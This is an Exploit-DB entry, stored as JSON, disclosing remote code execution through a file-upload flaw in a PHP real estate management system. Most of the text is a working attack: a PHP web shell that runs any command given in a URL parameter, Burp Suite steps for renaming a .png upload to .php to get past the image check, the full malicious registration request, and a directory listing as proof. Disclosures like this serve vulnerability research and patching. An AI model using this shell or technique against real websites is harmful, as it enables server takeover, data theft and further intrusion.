{"source": "https://www.exploit-db.com/exploits/51840", "vulnName": "Real Estate Management System v1.0 - Remote Code Execution via File Upload", "vulnEDBID": "51840", "vulnCVE": "N/A", "author": "DIYAR SAADI", "exploitType": "REMOTE", "platform": "PHP", "datePublished": "2024-03-03", "vulnContent": "# Exploit Title: Real Estate Management System v1.0 - Remote Code Execution via File Upload\n# Date: 2/11/2024\n# Exploit Author: Diyar Saadi\n# Vendor Homepage: https://codeastro.com\n# Version: V1.0\n# Tested on: Windows 11 +  XAMPP 8.0.30 + Burp Suite Professional v2023.12.1.3\n\n\n## Description ## \n\nThis Vulnerability allow the attacker to execute command injection payloads and upload malicious file into web server .\n\n-----------------------------------------------------------------------------------------------------------------------\n\n\n## Simple RCE Payload : ##\n\n<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system_payload($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n</html>\n-----------------------------------------------------------------------------------------------------------------------\n## Steps to Reproduce ## \n\n1- Open Burp Suite ( Community + Professional ) + Click on Proxy Tab Then Enable Intercept By Clicking at Intercept is off .\n2- Open The Browser From Proxy Tab Then Open The Resgister Web Page : http://localhost:8080/realestate/register.php\n3- Prepare Your RCE PHP Script Base From Notepad or Any Editor Then Save the RCE PHP Script Base as : avatar.php filename . \n4- Change The Filename extension into avatar.png ,  after save the RCE PHP Script .\n5- Click Chose File From User Image Section Then Upload Your avatar.png file .\n6- Click Register Then Back to Burp Suite Proxy Tab :\n7- Modify File Extension Into Orginal File Extension that is : avatar.php in Example :  Content-Disposition: form-data; name=\"uimage\"; filename=\"avatar.png\"\nContent-Type: image/png . \n8- After Modify The Content-Disposition From Burp Suite Proxy Tab Into Orginal File Extension Click Forward Button . \n9- Open The Login Page : http://localhost:8080/realestate/login.php Then Register Through Your Account Email & Password .\n10 - From MenuBar Click My Account & Profile Then Right Click at Image Icon > Copy Link > New Tab > Paste > Your Malicious Command is Ready To Execute .!\n\n-----------------------------------------------------------------------------------------------------------------------\n\n\n## Burp Request : ##\n\nPOST /realestate/register.php HTTP/1.1\nHost: localhost\nContent-Length: 1100\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarywA99kZOAu8APGlhv\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://localhost/realestate/register.php\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"name\"\n\njohnhamosh\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"email\"\n\nrasu1l@in.com\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"phone\"\n\n+199988764\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"pass\"\n\n<html> <body> <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"> <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"> <input type=\"SUBMIT\" value=\"Execute\"> </form> <pre> <?php     if(isset($_GET['cmd']))     {         system($_GET['cmd']);     } ?> </pre> </body> </html>\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"utype\"\n\nuser\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"uimage\"; filename=\"avatar.php\"\nContent-Type: image/png\n\n<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n</html>\n------WebKitFormBoundarypgW90eleiRxRzcEK\nContent-Disposition: form-data; name=\"reg\"\n\nRegister\n------WebKitFormBoundarypgW90eleiRxRzcEK--\n\n-----------------------------------------------------------------------------------------------------------------------\n\n\n## PoC Simple RCE Through This Vulnerability :  ##\n\nDirectory of C:\\xampp\\htdocs\\realestate\\admin\\user \n          ..\n02/11/2024  08:09 PM               315 avatar.php\n02/11/2024  08:04 PM               315 avatar.png\n02/11/2024  06:54 PM             9,376 avatarm2-min.jpg\n02/11/2024  06:54 PM            13,186 avatarm7-min.jpg\n02/11/2024  07:47 PM             1,814 avatars.php\n02/11/2024  06:54 PM             1,313 gr7.png\n02/11/2024  07:36 PM                28 poc.php\n\n-----------------------------------------------------------------------------------------------------------------------\n\n\n## Video PoC : ##\n\n1- https://github.com/vulnerablecms/RCE-RealEstateVIDEOPOC/blob/main/PoC-RCE.mp4\n2- https://gofile.io/d/AEWEgI\n-----------------------------------------------------------------------------------------------------------------------\n\n\nGreetz !\n            "}